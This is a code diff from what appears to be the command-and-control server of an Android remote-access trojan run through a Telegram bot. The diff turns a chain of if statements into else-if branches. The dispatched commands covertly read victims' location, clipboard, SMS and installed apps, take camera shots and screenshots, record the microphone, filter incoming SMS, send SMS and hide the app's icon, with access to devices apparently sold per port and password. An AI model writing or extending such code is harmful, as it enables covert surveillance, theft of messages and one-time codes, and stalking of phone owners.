@@ -821,9 +821,7 @@ const server = net.createServer(async (socket) => {
                                 await getSafeUsersByPort(message.port, message.password, async (allusers) => {
                                     socket.write(JSON.stringify(allusers));
                                 })
-                            }
-
-                            if (message.method == "getUserByDeviceId"){
+                            } else if (message.method == "getUserByDeviceId"){
                                 await getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
                                     if (user.status == false && user.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -843,9 +841,7 @@ const server = net.createServer(async (socket) => {
                                       socket.write(JSON.stringify(user));
                                     }
                                 })
-                            }
-
-                            if (message.method == "openUrl"){
+                            } else if (message.method == "openUrl"){
                                 await openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -863,9 +859,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "vibratePhone"){
+                            } else if (message.method == "vibratePhone"){
                                 await vibratePhone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -883,9 +877,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "sendToast"){
+                            } else if (message.method == "sendToast"){
                                 await sendToast(message.port, message.password, message.device_id, message.toast, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -903,9 +895,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "getGeoLocation"){
+                            } else if (message.method == "getGeoLocation"){
                                 await getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -923,9 +913,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "sendAllSMS"){
+                            } else if (message.method == "sendAllSMS"){
                                 await sendAllSMS(message.port, message.password, message.device_id, message.sms, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -943,9 +931,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "sendSMS"){
+                            } else if (message.method == "sendSMS"){
                                 await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -963,9 +949,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "getInstalledApps"){
+                            } else if (message.method == "getInstalledApps"){
                                 await getInstalledApps(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -983,9 +967,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "setSoundVolume"){
+                            } else if (message.method == "setSoundVolume"){
                                 await setSoundVolume(message.port, message.password, message.device_id, message.volume, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1003,9 +985,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "getClipboard"){
+                            } else if (message.method == "getClipboard"){
                                 await getClipboard(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1023,9 +1003,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "takeScreenshot"){
+                            } else if (message.method == "takeScreenshot"){
                                 await takeScreenshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1043,9 +1021,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "takeFrontshot"){
+                            } else if (message.method == "takeFrontshot"){
                                 await takeFrontshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1063,9 +1039,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "takeBackshot"){
+                            } else if (message.method == "takeBackshot"){
                                 await takeBackshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1083,9 +1057,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "recordBack"){
+                            } else if (message.method == "recordBack"){
                                 await recordBack(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1103,9 +1075,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "recordFront"){
+                            } else if (message.method == "recordFront"){
                                 await recordFront(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1123,9 +1093,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "recordMicrophone"){
+                            } else if (message.method == "recordMicrophone"){
                                 await recordMicrophone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1143,9 +1111,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "setSMSFilter"){
+                            } else if (message.method == "setSMSFilter"){
                                 await setSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1163,9 +1129,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "removeSMSFilter"){
+                            } else if (message.method == "removeSMSFilter"){
                                 await removeSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1183,9 +1147,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "hideApp"){
+                            } else if (message.method == "hideApp"){
                                 await hideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1203,9 +1165,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "unhideApp"){
+                            } else if (message.method == "unhideApp"){
                                 await unhideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1223,9 +1183,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "changeIcon"){
+                            } else if (message.method == "changeIcon"){
                                 await changeIcon(message.port, message.password, message.device_id, message.icon, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                         message.shortcut.edit == false ? await bot.sendMessage(
@@ -1243,9 +1201,7 @@ const server = net.createServer(async (socket) => {
                                         )
                                     }
                                 })
-                            }
-
-                            if (message.method == "changePortPassword"){
+                            } else if (message.method == "changePortPassword"){
                                 await changePortPassword(message.port, message.password, message.new_password, message.shortcut.msgowner, async (dt) => {
                                     message.shortcut.edit == false ? await bot.sendMessage(
                                         message.shortcut.chat_id,
@@ -1261,9 +1217,7 @@ const server = net.createServer(async (socket) => {
                                         }
                                     )
                                 })
-                            }
-
-                            if (message.method == "changeUsersOwning"){
+                            } else if (message.method == "changeUsersOwning"){
                                 await changeUsersOwning(message.port, message.password, message.new_port, message.new_password, message.userslength, async (dt) => {
                                     if (dt.status){
                                         let date = new Date();
